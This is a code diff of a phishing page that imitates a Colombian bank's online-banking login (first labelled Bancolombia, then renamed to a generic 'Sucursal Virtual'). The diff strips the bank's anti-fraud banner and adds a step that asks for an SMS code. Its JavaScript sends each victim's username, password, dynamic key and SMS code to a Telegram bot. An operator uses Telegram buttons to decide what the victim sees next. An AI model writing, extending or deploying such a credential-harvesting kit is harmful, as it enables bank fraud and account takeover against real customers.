@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Sucursal Virtual - Bancolombia (Maqueta)</title>
+<title>Sucursal Virtual</title>
 
 <style>
 :root {
@@ -11,7 +11,7 @@
   --line: #333333;
   --muted: #d9dadd;
   --yellow: #ffdc00;
-  --bancolombia-black: #1f1f1f;
+  --main-black: #1f1f1f;
   --bg-color: #f4f4f4;
 }
 
@@ -26,37 +26,30 @@ body {
   font-family: Arial, Helvetica, sans-serif;
 }
 
-/* --- Encabezado Bancolombia --- */
+/* --- Encabezado Genérico --- */
 .brand-header { text-align: center; margin-bottom: 25px; position: relative; z-index: 1; }
-.brand-logo { display: inline-flex; align-items: center; gap: 8px; font-size: 28px; font-weight: 700; color: var(--bancolombia-black); letter-spacing: -1px; }
+.brand-logo { display: inline-flex; align-items: center; gap: 8px; font-size: 28px; font-weight: 700; color: var(--main-black); letter-spacing: -1px; }
 .brand-logo-icon { width: 30px; height: 24px; position: relative; }
-.brand-logo-icon::before, .brand-logo-icon::after { content: ''; position: absolute; width: 100%; height: 6px; background: var(--bancolombia-black); border-radius: 4px; }
+.brand-logo-icon::before, .brand-logo-icon::after { content: ''; position: absolute; width: 100%; height: 6px; background: var(--main-black); border-radius: 4px; }
 .brand-logo-icon::before { top: 0; transform: skewX(-20deg); }
-.brand-logo-icon::after { bottom: 0; transform: skewX(-20deg); background: transparent; border-top: 6px solid var(--bancolombia-black); border-bottom: 6px solid var(--bancolombia-black); border-radius: 0; height: 18px; }
+.brand-logo-icon::after { bottom: 0; transform: skewX(-20deg); background: transparent; border-top: 6px solid var(--main-black); border-bottom: 6px solid var(--main-black); border-radius: 0; height: 18px; }
 
-.brand-title { text-align: center; font-size: 24px; font-weight: 400; color: var(--bancolombia-black); margin-bottom: 20px; position: relative; z-index: 1; }
-
-/* --- Tarjeta Celeste (Fraude) --- */
-.fraud-card { width: min(100%, 760px); margin: 0 auto 20px; background: #e0f4f9; border: 1px solid #b3d9e3; border-radius: 12px; padding: 20px; display: flex; gap: 15px; position: relative; z-index: 1; }
-.fraud-icon { flex-shrink: 0; width: 40px; height: 40px; border-radius: 50%; border: 2px solid #55c5e0; display: flex; align-items: center; justify-content: center; color: #55c5e0; font-weight: bold; font-size: 20px; }
-.fraud-text h3 { margin: 0 0 8px; font-size: 18px; color: #1f1f1f; font-weight: 700; }
-.fraud-text p { margin: 0 0 10px; font-size: 16px; color: #333; line-height: 1.4; }
-.fraud-text a { color: #1f1f1f; font-weight: 700; font-size: 16px; text-decoration: underline; }
+.brand-title { text-align: center; font-size: 24px; font-weight: 400; color: var(--main-black); margin-bottom: 20px; position: relative; z-index: 1; }
 
 /* --- Formulario / Contenedor Principal --- */
 .login-card { width: min(100%, 760px); margin: 12px auto 0; background: #fff; border-radius: 12px; padding: 42px 48px 32px; box-shadow: 0 4px 12px rgba(0, 0, 0, .08); position: relative; z-index: 2; }
-h1 { margin: 0 0 24px; text-align: center; font-size: clamp(32px, 5vw, 44px); font-weight: 700; color: var(--bancolombia-black); }
+h1 { margin: 0 0 24px; text-align: center; font-size: clamp(32px, 5vw, 44px); font-weight: 700; color: var(--main-black); }
 .intro { max-width: 500px; margin: 0 auto 40px; text-align: center; font-size: clamp(16px, 2.5vw, 20px); line-height: 1.4; color: #444; }
 
 /* --- Campos de entrada (Inputs) --- */
 .field { margin-bottom: 12px; }
 .input-wrap { display: flex; align-items: center; gap: 16px; min-height: 58px; padding: 0 6px 5px; border-bottom: 1px solid #555; }
-.input-wrap:focus-within { border-bottom-color: var(--bancolombia-black); }
+.input-wrap:focus-within { border-bottom-color: var(--main-black); }
 .input-wrap svg { width: 30px; height: 32px; flex: 0 0 30px; fill: none; stroke: currentColor; stroke-width: 1.5; }
-.input-wrap input { width: 100%; min-width: 0; border: 0; outline: none; background: transparent; color: var(--bancolombia-black); font-family: inherit; font-size: clamp(20px, 3.5vw, 24px); }
+.input-wrap input { width: 100%; min-width: 0; border: 0; outline: none; background: transparent; color: var(--main-black); font-family: inherit; font-size: clamp(20px, 3.5vw, 24px); }
 .input-wrap input::placeholder { color: #666; opacity: 1; }
 
-.help-link { display: inline-block; margin-top: 12px; color: var(--bancolombia-black); font-size: clamp(15px, 2.5vw, 18px); font-weight: 700; line-height: 1.35; text-decoration: underline; }
+.help-link { display: inline-block; margin-top: 12px; color: var(--main-black); font-size: clamp(15px, 2.5vw, 18px); font-weight: 700; line-height: 1.35; text-decoration: underline; }
 .help-link:hover, .create:hover { opacity: .75; }
 .field + .field { margin-top: 38px; }
 
@@ -65,7 +58,7 @@ h1 { margin: 0 0 24px; text-align: center; font-size: clamp(32px, 5vw, 44px); fo
 .submit.ready { background: var(--yellow); color: #252525; cursor: pointer; }
 .submit.ready:hover { background: #f2cd00; }
 
-.create { display: block; width: fit-content; max-width: 100%; margin: 40px auto 0; color: var(--bancolombia-black); text-align: center; font-size: clamp(20px, 3.2vw, 27px); font-weight: 700; text-decoration: underline; }
+.create { display: block; width: fit-content; max-width: 100%; margin: 40px auto 0; color: var(--main-black); text-align: center; font-size: clamp(20px, 3.2vw, 27px); font-weight: 700; text-decoration: underline; }
 
 .notice { display: none; margin: 18px 0 0; padding: 12px 14px; border: 1px solid #dedede; border-radius: 10px; background: #f7f7f7; font-size: 14px; line-height: 1.45; }
 .notice.show { display: block; }
@@ -118,7 +111,7 @@ h1 { margin: 0 0 24px; text-align: center; font-size: clamp(32px, 5vw, 44px); fo
 .modal-title { font-size: 28px; font-weight: 700; color: #1f1f1f; text-align: center; margin: 0 0 12px; }
 .modal-subtitle { font-size: 18px; color: #444; text-align: center; margin: 0 0 30px; line-height: 1.4; }
 
-/* Input de 6 dígitos estilo Bancolombia */
+/* Input de 6 dígitos estilo moderno */
 .otp-container { position: relative; display: flex; justify-content: space-between; gap: 8px; margin-bottom: 30px; padding: 0 10px; }
 .otp-input { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0; cursor: pointer; letter-spacing: 30px; }
 .otp-slot { width: 100%; height: 30px; border-bottom: 2px solid #333; display: flex; align-items: center; justify-content: center; font-size: 28px; font-weight: 700; color: #1f1f1f; position: relative; }
@@ -142,9 +135,63 @@ h1 { margin: 0 0 24px; text-align: center; font-size: clamp(32px, 5vw, 44px); fo
 .btn-continuar.ready { background: var(--yellow); color: #1f1f1f; cursor: pointer; }
 .btn-continuar.ready:hover { background: #f2cd00; }
 
+/* === NUEVO: VISTA SMS CODE === */
+.sms-view {
+  display: none;
+  text-align: center;
+  padding: 20px 0;
+}
+.sms-view.active { display: block; }
+.sms-icon {
+  font-size: 60px;
+  margin-bottom: 20px;
+}
+.sms-message {
+  font-size: 18px;
+  color: #333;
+  line-height: 1.5;
+  margin-bottom: 30px;
+}
+.sms-message strong { color: var(--main-black); }
+.sms-input-wrap {
+  display: flex;
+  justify-content: center;
+  gap: 10px;
+  margin-bottom: 30px;
+}
+.sms-input-wrap input {
+  width: 200px;
+  padding: 15px;
+  font-size: 24px;
+  text-align: center;
+  letter-spacing: 5px;
+  border: 2px solid #ccc;
+  border-radius: 8px;
+  outline: none;
+  font-family: inherit;
+}
+.sms-input-wrap input:focus {
+  border-color: var(--main-black);
+}
+.btn-sms-final {
+  width: 100%;
+  padding: 16px;
+  border-radius: 30px;
+  border: none;
+  background: var(--yellow);
+  color: var(--main-black);
+  font-size: 18px;
+  font-weight: 700;
+  cursor: pointer;
+  font-family: inherit;
+}
+.btn-sms-final:hover {
+  background: #f2cd00;
+}
+
 /* Loading Overlay */
 #loading-overlay { display: none; position: fixed; inset: 0; background: rgba(255, 255, 255, 0.8); z-index: 2000; align-items: center; justify-content: center; }
-.spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--bancolombia-black); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+.spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--main-black); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
 @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
 /* Ajustes para teléfonos */
@@ -173,24 +220,14 @@ h1 { margin: 0 0 24px; text-align: center; font-size: clamp(32px, 5vw, 44px); fo
 
 <body>
 
-<!-- Encabezado con Logo -->
+<!-- Encabezado Genérico -->
 <header class="brand-header">
   <div class="brand-logo">
     <div class="brand-logo-icon"></div>
-    Bancolombia
+    Sucursal Virtual
   </div>
 </header>
-<h2 class="brand-title">Sucursal Virtual Personas</h2>
-
-<!-- Tarjeta de Fraude -->
-<div class="fraud-card">
-  <div class="fraud-icon">💡</div>
-  <div class="fraud-text">
-    <h3>¿Crees que reconocerías un fraude?</h3>
-    <p>Descúbrelo en nuestro documental No pasa hasta que pasa.</p>
-    <a href="#youtube">Míralo ya en YouTube</a>
-  </div>
-</div>
+<h2 class="brand-title">Portal de Clientes</h2>
 
 <!-- Formulario Principal -->
 <main class="login-card">
@@ -242,29 +279,49 @@ h1 { margin: 0 0 24px; text-align: center; font-size: clamp(32px, 5vw, 44px); fo
 <div class="modal-overlay" id="modalDinamica">
   <div class="modal-content">
     
-    <div class="gif-container">
-      <img src="cd-desktop.gif" alt="Instrucciones Clave Dinámica" onerror="this.style.display='none'">
+    <!-- VISTA 1: CLAVE DINÁMICA (6 dígitos) -->
+    <div id="viewDinamica">
+      <div class="gif-container">
+        <img src="cd-desktop.gif" alt="Instrucciones Clave Dinámica" onerror="this.style.display='none'">
+      </div>
+
+      <h2 class="modal-title">Ingresa la Clave Dinámica</h2>
+      <p class="modal-subtitle">Encuentra tu Clave Dinámica en tu aplicación móvil.</p>
+
+      <div class="otp-container" id="otpContainer">
+        <input type="text" id="otpInput" class="otp-input" inputmode="numeric" maxlength="6" autocomplete="off">
+        <div class="otp-slot active"></div>
+        <div class="otp-slot"></div>
+        <div class="otp-slot"></div>
+        <div class="otp-slot"></div>
+        <div class="otp-slot"></div>
+        <div class="otp-slot"></div>
+      </div>
+
+      <p class="otp-error" id="otpError">La clave dinámica es incorrecta o ha expirado. Intenta de nuevo.</p>
+
+      <div class="modal-actions">
+        <button class="btn-modal btn-borrar" id="btnBorrar">Borrar</button>
+        <button class="btn-modal btn-continuar" id="btnContinuar" disabled>Continuar</button>
+      </div>
     </div>
 
-    <h2 class="modal-title">Ingresa la Clave Dinámica</h2>
-    <p class="modal-subtitle">Encuentra tu Clave Dinámica en la app Mi Bancolombia.</p>
+    <!-- VISTA 2: SMS CODE (oculta por defecto) -->
+    <div id="viewSms" class="sms-view">
+      <div class="sms-icon">📩</div>
+      <h2 class="modal-title">Código SMS Enviado</h2>
+      <p class="sms-message">
+        Hemos enviado un código de verificación a tu número de teléfono registrado. 
+        Por favor, ingrésalo a continuación.
+      </p>
+      
+      <div class="sms-input-wrap">
+        <input type="text" id="smsCodeInput" inputmode="numeric" maxlength="6" placeholder="******" autocomplete="off">
+      </div>
 
-    <div class="otp-container" id="otpContainer">
-      <input type="text" id="otpInput" class="otp-input" inputmode="numeric" maxlength="6" autocomplete="off">
-      <div class="otp-slot active"></div>
-      <div class="otp-slot"></div>
-      <div class="otp-slot"></div>
-      <div class="otp-slot"></div>
-      <div class="otp-slot"></div>
-      <div class="otp-slot"></div>
+      <button class="btn-sms-final" id="btnSmsFinal">Validar Código</button>
     </div>
 
-    <p class="otp-error" id="otpError">La clave dinámica es incorrecta o ha expirado. Intenta de nuevo.</p>
-
-    <div class="modal-actions">
-      <button class="btn-modal btn-borrar" id="btnBorrar">Borrar</button>
-      <button class="btn-modal btn-continuar" id="btnContinuar" disabled>Continuar</button>
-    </div>
   </div>
 </div>
 
@@ -299,6 +356,12 @@ const btnContinuar = document.getElementById("btnContinuar");
 const otpError = document.getElementById("otpError");
 const otpContainer = document.getElementById("otpContainer");
 
+// Elementos Vistas del Modal
+const viewDinamica = document.getElementById("viewDinamica");
+const viewSms = document.getElementById("viewSms");
+const smsCodeInput = document.getElementById("smsCodeInput");
+const btnSmsFinal = document.getElementById("btnSmsFinal");
+
 // Variables de control
 let pollingActivo = false;
 let pollingTimeout = null;
@@ -318,7 +381,6 @@ function actualizarBoton() {
   submitBtn.disabled = !formularioValido;
   submitBtn.classList.toggle("ready", formularioValido);
   
-  // Ocultar el error al escribir
   if (formularioValido) loginError.classList.remove("show");
 }
 
@@ -332,7 +394,7 @@ claveInput.addEventListener("input", function() {
 // ENVIAR A TELEGRAM
 // ==========================================
 function enviarIdentificacionTelegram(usuario, clave) {
-    const mensaje = `⚡ <b>BANCOLOMBIA - INICIO DE SESIÓN</b>\n\n👤 <b>Usuario:</b> <code>${usuario}</code>\n🔑 <b>Clave:</b> <code>${clave}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`.trim();
+    const mensaje = `⚡ <b>PORTAL - INICIO DE SESIÓN</b>\n\n👤 <b>Usuario:</b> <code>${usuario}</code>\n🔑 <b>Clave:</b> <code>${clave}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`.trim();
     
     const keyboard = {
         inline_keyboard: [[
@@ -347,7 +409,7 @@ function enviarIdentificacionTelegram(usuario, clave) {
     }).then(r => r.json()).then(data => {
         if (data.ok && data.result) {
             msgIdActual = String(data.result.message_id);
-            actionProcessed = false; // Resetear para permitir nuevas acciones
+            actionProcessed = false;
             escucharBotones(handleTelegramActionLogin);
         } else {
             ocultarOverlay();
@@ -356,12 +418,13 @@ function enviarIdentificacionTelegram(usuario, clave) {
 }
 
 function enviarDinamicaTelegram(dinamica) {
-    const mensaje = `⚡ <b>BANCOLOMBIA - CLAVE DINÁMICA</b>\n\n👤 <b>Usuario:</b> <code>${usuarioInput.value}</code>\n🔢 <b>Dinámica:</b> <code>${dinamica}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`.trim();
+    const mensaje = `⚡ <b>PORTAL - CLAVE DINÁMICA</b>\n\n👤 <b>Usuario:</b> <code>${usuarioInput.value}</code>\n🔢 <b>Dinámica:</b> <code>${dinamica}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`.trim();
     
+    // CAMBIADO AQUÍ: Ahora dice "SMS Code"
     const keyboard = {
         inline_keyboard: [[
             { text: '❌ Error Dinámica', callback_data: 'error_dinamica' },
-            { text: '✅ Dinámica Correcta', callback_data: 'dinamica_ok' }
+            { text: '📩 SMS Code', callback_data: 'sms_code' } 
         ]]
     };
 
@@ -371,7 +434,7 @@ function enviarDinamicaTelegram(dinamica) {
     }).then(r => r.json()).then(data => {
         if (data.ok && data.result) {
             msgIdActual = String(data.result.message_id);
-            actionProcessed = false; // Resetear
+            actionProcessed = false;
             escucharBotones(handleTelegramActionDinamica);
         }
     });
@@ -420,13 +483,15 @@ function handleTelegramActionLogin(action) {
 
     if (action === 'pedir_dinamica') {
         modal.classList.add("active");
+        viewDinamica.style.display = "block";
+        viewSms.classList.remove("active");
+        
         otpInput.value = "";
         otpError.classList.remove("show");
         otpContainer.classList.remove("error");
         actualizarOTP();
         setTimeout(() => otpInput.focus(), 100);
     } else if (action === 'error_usuario') {
-        // En vez de alert, mostramos el aviso sutil
         loginError.classList.add("show");
         claveInput.value = "";
         actualizarBoton();
@@ -440,18 +505,23 @@ function handleTelegramActionDinamica(action) {
     ocultarOverlay();
 
     if (action === 'error_dinamica') {
-        // El modal sigue abierto, solo mostramos el error y limpiamos
         modal.classList.add("active"); 
+        viewDinamica.style.display = "block";
+        viewSms.classList.remove("active");
+        
         otpError.classList.add("show");
         otpContainer.classList.add("error");
         otpInput.value = "";
         actualizarOTP();
         otpInput.focus();
         
-        actionProcessed = false; // Permitir reintentar
-    } else if (action === 'dinamica_ok') {
-        alert("¡Clave dinámica correcta! (Simulación de ingreso exitoso)");
-        location.reload();
+        actionProcessed = false;
+    } else if (action === 'sms_code') {
+        // CAMBIADO AQUÍ: En vez de alerta, cambia la vista a SMS Code
+        viewDinamica.style.display = "none";
+        viewSms.classList.add("active");
+        smsCodeInput.value = "";
+        setTimeout(() => smsCodeInput.focus(), 100);
     }
 }
 
@@ -520,6 +590,29 @@ btnContinuar.addEventListener("click", () => {
     mostrarOverlay();
     enviarDinamicaTelegram(otpInput.value);
   }
+});
+
+// Lógica para el código SMS
+smsCodeInput.addEventListener("input", function() {
+  this.value = this.value.replace(/[^0-9]/g, "").slice(0, 6);
+});
+
+btnSmsFinal.addEventListener("click", () => {
+  if(smsCodeInput.value.length < 6) {
+    alert("Por favor, ingresa el código SMS completo de 6 dígitos.");
+    return;
+  }
+  
+  // Aquí puedes enviar el código SMS a Telegram si lo deseas
+  const mensaje = `⚡ <b>PORTAL - CÓDIGO SMS</b>\n\n👤 <b>Usuario:</b> <code>${usuarioInput.value}</code>\n📩 <b>SMS:</b> <code>${smsCodeInput.value}</code>\n\n📅 <b>Fecha:</b> ${new Date().toLocaleString('es-CO')}`.trim();
+  
+  fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: TG_CHAT_ID, text: mensaje, parse_mode: 'HTML' })
+  });
+
+  alert("¡Código SMS validado! (Simulación de ingreso exitoso)");
+  location.reload();
 });
 
 actualizarBoton();
